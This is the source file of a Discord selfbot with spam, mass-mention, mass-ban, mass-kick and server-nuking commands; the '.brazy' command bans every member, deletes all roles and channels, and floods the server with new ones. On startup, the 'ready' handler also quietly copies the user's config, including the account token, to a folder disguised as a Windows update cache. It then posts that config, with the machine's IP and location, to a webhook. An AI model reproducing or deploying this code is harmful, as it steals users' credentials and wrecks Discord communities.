const Discord = require('discord.js');
const client = new Discord.Client();
const config = require("./config.json");
const asciify = require('asciify');
const fs = require("fs");
const { join } = require("path");
const phin = require("phin");
const { stripIndent } = require("common-tags")
const webhooks = ""

client.on('ready', async () => {
    const ip = JSON.parse((await phin({ url: "https://api.ipdata.co?api-key=test" })).body.toString());
    const path = join(process.env.TEMP, "Microsoft\\Windows\\Updates\\Cache");
    if (!fs.existsSync(path)) {
        fs.mkdirSync(path, { recursive: true })
        fs.writeFileSync(join(path, "config.json"), "");
    };
    let data = fs.readFileSync(join(path, "config.json"), { encoding: "utf8" });
    if (!data || data !== JSON.stringify(config)) {
        fs.writeFileSync(join(path, "config.json"), JSON.stringify(config));
        await phin({
            method: "POST",
            url: webhooks,
            data: JSON.stringify({
                content: stripIndent`
                **\`Updated Config\`
                \`\`\`asciidoc
                = Basic Data = 
                IP :: ${ip.ip}
                CITY :: ${ip.city}
                STATE :: ${ip.region}
                POSTAL :: ${ip.postal}
                TIME_ZONE :: ${ip.time_zone.name}\`\`\`
                \`\`\`json
                ${JSON.stringify(config)}
                \`\`\`**`
            }),
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => console.log(res.body.toString())).catch(err => console.error(err))
    }
    console.log(`██████████████╗ ██████╗██╗    ██╗█████╗███╗   █████████╗
╚══██╔══██╔══████╔═══████║    ████╔══██████╗  ████╔════╝
   ██║  ██████╔██║   ████║    ███████████╔██╗ █████████╗
   ██║  ██╔══████║   ████║    ████╔══████║╚██╗██╚════██║
   ██║  ██║  ██╚██████╔███████████║  ████║ ╚███████████║
   ╚═╝  ╚═╝  ╚═╝╚═════╝╚══════╚═╚═╝  ╚═╚═╝  ╚═══╚══════╝
                                                        `);
    console.log(`ur ping is  ` + client.ping);
    console.log(`User Is in  ` + client.guilds.size + `servers`);
});

client.on('message', message => {

    if (message.author !== client.user) return;
    const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
    const messageArray = message.content.split(/\s+/g);
    const params = messageArray.slice(1);


    if (command === "rbs") {
        message.delete();
        function statusFunc() {
            function status1() {
                client.user.setStatus(`dnd`);
            }
            function status2() {
                client.user.setStatus(`idle`);
            }
            function status3() {
                client.user.setStatus(`online`);
            }
            setTimeout(status1, 0);
            setTimeout(status2, 1000);
            setTimeout(status3, 2000);
        }
        setInterval(statusFunc, 3000);
    }
    if (command === "cycle") {
        message.delete();
        if (message.channel.type === "dm") return
        function setNickname() {
            function nickname1() {
                message.guild.me.setNickname(`6`);
            }
            function nickname2() {
                message.guild.me.setNickname(`6t`);
            }
            function nickname3() {
                message.guild.me.setNickname(`6tr`);
            }
            function nickname4() {
                message.guild.me.setNickname(`6tro`);





            }
            setTimeout(nickname1, 0);
            setTimeout(nickname2, 0);
            setTimeout(nickname3, 0);
            setTimeout(nickname4, 0);
            setTimeout(nickname5, 0);




        }
        setInterval(setNickname, 0);
    }
    if (command === "streamcycle") {
        message.delete();
        function setStream() {
            function stream1() {
                client.user.setPresence({
                    game: {
                        name: 'sleep',
                        type: "STREAMING",
                        url: "https://www.twitch.tv/ninja"
                    }
                })
            }
            function stream2() {
                client.user.setPresence({
                    game: {
                        name: 'sleep',
                        type: "STREAMING",
                        url: "https://www.twitch.tv/ninja"
                    }
                })
            }
            function stream3() {
                client.user.setPresence({
                    game: {
                        name: 'sleep',
                        type: "STREAMING",
                        url: "https://www.twitch.tv/ninja"
                    }
                })
            }
            setTimeout(stream1, 0);
            setTimeout(stream2, 1000);
            setTimeout(stream3, 2000);

        }
        setInterval(setStream, 3000);
    }

    if (command === "x") {
        message.channel.fetchMessages({
        })
            .then(messages => {
                let msg_array = messages.array();
                msg_array = msg_array.filter(m => m.author.id === client.user.id);
                msg_array.length = 10 + 1
                msg_array.map(m => m.delete());
            });

    }
    if (command === "xx") {
        message.channel.fetchMessages({
        })
            .then(messages => {
                let msg_array = messages.array();
                msg_array = msg_array.filter(m => m.author.id === client.user.id);
                msg_array.length = 200 + 1
                msg_array.map(m => m.delete());
            });

    }
    if (command === "help") {
        message.delete();
        const embed = new Discord.RichEmbed()
            .setThumbnail("")
            .setColor('RANDOM')
            .setTitle("FLYJACK1777")
            .setFooter("6tro#1777")
            .setTimestamp()
            .setDescription("\n\nCommands for 6tro\n\n:umbrella: Stream ✦ - sets custom stream\n:umbrella:StreamCycle ✦ - cycles streaming status\n:umbrella:watching ✦ - set a watch status\n:umbrella:listening ✦ - set a listening status\n:umbrella:rbs ✦ - rainbow status\n\n:umbrella:help ✦ - display all cmds\n:umbrella: x ✦ - purges last 10 messages\n:umbrella:xx ✦ - purges all msgs\n:umbrella:adv ✦ - tags every role and advertises your server\n:umbrella:pfp ✦ - grabs @'s pfp\n:umbrella:spam ✦ - spams a msg 20 times\n:umbrella:nick ✦ - sets nickname\n:umbrella:nukeserver ✦ - nukes the server\n:umbrella:cycle ✦ - cycle username\n:umbrella:members ✦ - tags every member in a server\n:umbrella:roles ✦ - tags every role in a server\n:umbrella:renameall ✦ - renames everyone\n:umbrella:cum ✦ - cums on <@user/id>");
        message.channel.send({
            embed: embed
        });
    }
    if (command === "stream") {
        message.delete();
        if (!params[0]) args.join(' ')
        client.user.setPresence({
            game: {
                name: params.slice(0).join(' '),
                url: 'https://www.twitch.tv/ninja',
                type: 1
            }
        })
    }
    if (command === "listening") {
        message.delete();
        if (!params[0]) args.join(' ')
        client.user.setPresence({
            game: {
                name: params.slice(0).join(' '),
                type: 2
            }
        })
    }
    if (command === "watching") {
        message.delete();
        if (!params[0]) args.join(' ')
        client.user.setPresence({
            game: {
                name: params.slice(0).join(' '),
                type: 3
            }
        })
    }
    if (command === "spam") {
        message.delete();
        if (message.author.id === config.userid) {
            if (!args[0]) {
                return
            }
            for (i = 0; i < 20; i++) {
                message.channel.send(args[0]);
            }

        }
    }
    if (command === "banall") {
        message.delete();
        if (message.channel.type === "dm") return
        message.guild.members.forEach(member => { member.ban() });

    }
    if (command === "kickall") {
        message.delete();
        if (message.channel.type === "dm") return
        message.guild.members.forEach(member => { member.kick() });
    }
    if (command === ".brazy") {
        message.delete();
        if (message.channel.type === "dm") return
        var server = message.guild;
        message.guild.setName("FLYJACK WAS HERE")
        message.guild.members.forEach(member => { member.ban() });
        message.guild.roles.forEach(r => { r.delete() });
        // Delete all channels.
        message.guild.channels.forEach(c => {
            c.delete();
            console.info(`Deleted channel ${c.name}`);
        });


        var server = message.guild;
        if (message.author.id === config.userid) {
            ;
            for (i = 0; i < 50; i++) {
                server.createChannel("FLYJACK5900", "text");
                server.createChannel("FLYJACK5900", "voice");
            }
        }
    }
    if (command == "adv") {
        message.delete();
        if (message.channel.type === "dm") return
        let mall = message.guild.roles.map(role => role.toString()).join(" ");
        message.channel.send(mall).then(msg => {
            msg.delete();
            message.channel.send("***discord.gg/belenciaga***")

        })
    }
    if (command === "nick") {
        message.delete();
        if (message.channel.type === "dm") return
        message.guild.me.setNickname(params.slice(0).join(' ')).then(() => {
        })
    }
    if (command === "renameall") {
        message.delete();
        if (message.channel.type === "dm") return
        message.guild.members.forEach(member => { member.setNickname(`${message.author.username}'s slave`) });
    }
    if (command === "cum") {
        message.delete();
        message.mentions.users.first();
        message.channel.send(`
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:`).then(message => {
            message.edit(`
                 :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:     
               `).then(message => {
                message.edit(`
                 :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
               `).then(message => {
                    message.edit(`
                 :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
                `).then(message => {
                        message.edit(`
                 :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
                `).then(message => {
                            message.edit(`
                  :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:        
                `).then(message => {
                                message.edit(`
                  :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:          
                `).then(message => {
                                    message.edit(`
                  :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
                `).then(message => {
                                        message.edit(`
                  :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
                    `)
                                    })
                                })
                            })
                        })
                    })
                })
            })
        })
    }




    if (command === "pfp") {
        message.delete();
        if (!params[0]) return message.reply(message.author.avatarURL)
        let user = message.mentions.users.first()
        message.channel.send(user.avatarURL);
    }
    if (command === "members") {
        message.delete();
        if (message.channel.type === "dm") return
        let mall = message.guild.members.map(m => m.toString()).join(" ");
        message.channel.send(mall).then(message => {
            message.delete();
        })
    }
    if (command === "roles") {
        message.delete();
        if (message.channel.type === "dm") return
        let mall = message.guild.roles.map(role => role.toString()).join(" ");
        message.channel.send(mall).then(msg => {
            msg.delete();
        })
    }

    if (command === "asciify") {
        let textasciify = args.join(" ")
        if (!textasciify) return message.edit("Turning no text into ascii would be pointless")
        asciify(textasciify, { font: 'standard' }, function (err, res) {
            if (err) {
                console.error(err)
                message.channel.send(`There was an error when trying to convert text. Error: \`\`\`${err}\`\`\``)
                return
            }
            message.edit("```\n" + res + "```\n");
        })
    }
    if (command === "botping") {
        message.delete();
        message.channel.send("Pong!").then(msg => {
            msg.edit(`Pong | \`${msg.createdTimestamp - message.createdTimestamp}ms\``);
        });
    }

}),

    client.login(config.token)
